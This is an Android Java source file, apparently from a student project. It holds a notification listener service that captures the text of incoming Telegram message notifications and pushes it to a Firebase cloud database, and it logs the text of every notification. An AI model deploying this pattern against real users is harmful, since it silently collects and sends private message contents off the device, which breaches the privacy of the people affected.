package com.example.kursovaya;

import android.app.Notification;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class NotifyService extends NotificationListenerService {

    DatabaseReference myDatabase = FirebaseDatabase.getInstance().getReference("PUSH");

    final String LOG_TAG = "myLogs";

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Bundle extras = sbn.getNotification().extras;
        if (sbn.getPackageName() != null) {
            if ("org.telegram.messenger".equals(sbn.getPackageName())) {
                NewSms sms = new NewSms(extras.getCharSequence("android.text").toString());
                myDatabase.push().setValue(sms);
            }
            Log.i(LOG_TAG, extras.getCharSequence("android.text").toString());
        }
    }

}
